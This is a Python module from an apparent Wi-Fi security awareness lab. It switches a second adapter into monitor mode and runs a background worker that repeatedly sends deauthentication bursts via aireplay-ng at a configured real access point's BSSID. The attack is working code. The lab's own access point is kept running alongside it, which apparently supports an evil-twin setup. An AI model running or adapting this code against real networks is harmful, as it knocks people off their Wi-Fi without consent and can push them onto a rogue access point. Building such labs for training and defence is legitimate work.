"""Background deauth worker for the awareness lab (second adapter required)."""

from __future__ import annotations

import threading
import time
from typing import TYPE_CHECKING, Optional

from modules.constants import DEAUTH_COUNT, DEAUTH_GAP_SEC
from modules.monitor import iface_type, run_deauth
from modules.tools import run_cmd, which_or_none

if TYPE_CHECKING:
    from modules.figolab.awareness.awareness_metrics import MetricsStore
    from modules.figolab.lab_config import LabConfig


def enable_monitor_light(iface: str, channel: str) -> tuple[Optional[str], str]:
    """
    Put *iface* into monitor mode without ``airmon-ng check kill``.

    ``check kill`` would tear down the lab AP on the primary adapter.
    """
    ip = which_or_none("ip")
    iw = which_or_none("iw")
    if not ip or not iw:
        return None, "Missing ip or iw for monitor mode."
    if not iface:
        return None, "No deauth interface configured."

    code, out = run_cmd([ip, "link", "set", iface, "down"], timeout=15)
    if code != 0:
        return None, out or f"Could not bring {iface} down."

    _run_iw = run_cmd([iw, "dev", iface, "set", "type", "monitor"], timeout=15)
    code, out = run_cmd([ip, "link", "set", iface, "up"], timeout=15)
    if code != 0:
        return None, out or f"Could not bring {iface} up."

    if channel.isdigit():
        run_cmd([iw, "dev", iface, "set", "channel", channel], timeout=15)

    if iface_type(iface) == "monitor":
        return iface, "Monitor mode enabled."
    return None, _run_iw[1] or "Failed to set monitor mode on deauth adapter."


def restore_managed_light(iface: str) -> None:
    """Best-effort return deauth adapter to managed mode."""
    ip = which_or_none("ip")
    iw = which_or_none("iw")
    if not ip or not iw or not iface:
        return
    run_cmd([ip, "link", "set", iface, "down"], timeout=15)
    run_cmd([iw, "dev", iface, "set", "type", "managed"], timeout=15)
    run_cmd([ip, "link", "set", iface, "up"], timeout=15)


class DeauthWorker:
    """Send periodic deauth frames toward the legitimate target BSSID."""

    def __init__(self, config: "LabConfig", metrics: "MetricsStore") -> None:
        self.config = config
        self.metrics = metrics
        self._stop = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self.monitor_iface: Optional[str] = None
        self.base_iface: str = ""
        self.active = False
        self.bursts_sent: int = 0
        self.last_error: str = ""

    def start(self) -> bool:
        if not self.config.deauth_enabled or not self.config.deauth_interface:
            return False
        if not self.config.target_bssid.strip():
            self.last_error = "Target BSSID is missing."
            return False
        if which_or_none("aireplay-ng") is None:
            self.last_error = "aireplay-ng not found — install aircrack-ng."
            return False

        self.base_iface = self.config.deauth_interface
        mon, err = enable_monitor_light(self.base_iface, str(self.config.channel))
        if not mon:
            self.last_error = err
            self.metrics.add_event("deauth", f"Deauth failed to start: {err[:80]}")
            return False

        self.monitor_iface = mon
        self.active = True
        self._thread = threading.Thread(
            target=self._loop,
            name="figo-lab-deauth",
            daemon=True,
        )
        self._thread.start()
        self.metrics.add_event(
            "deauth",
            f"Deauth active · {self.base_iface} → {self.config.target_bssid[:17]}",
        )
        return True

    def _loop(self) -> None:
        mon = self.monitor_iface
        bssid = self.config.target_bssid
        if not mon or not bssid:
            return
        while not self._stop.is_set():
            code, out = run_deauth(mon, bssid, count=DEAUTH_COUNT)
            self.bursts_sent += 1
            if code != 0 and self.bursts_sent == 1:
                self.last_error = (out or "deauth failed")[:120]
                self.metrics.add_event("deauth", f"Deauth burst failed: {self.last_error[:60]}")
            elif self.bursts_sent == 1:
                self.metrics.add_event("deauth", "First deauth burst sent toward real AP")
            if self._stop.wait(DEAUTH_GAP_SEC):
                break

    def stop(self) -> None:
        self._stop.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=DEAUTH_GAP_SEC + 5)
        self._thread = None
        if self.base_iface:
            restore_managed_light(self.base_iface)
        self.monitor_iface = None
        self.active = False

    def status_label(self) -> str:
        if not self.config.deauth_enabled:
            return "Disabled (single adapter)"
        if self.active:
            return f"Active · {self.base_iface} · bursts {self.bursts_sent}"
        if self.last_error:
            return f"Failed · {self.last_error[:40]}"
        return "Not started"
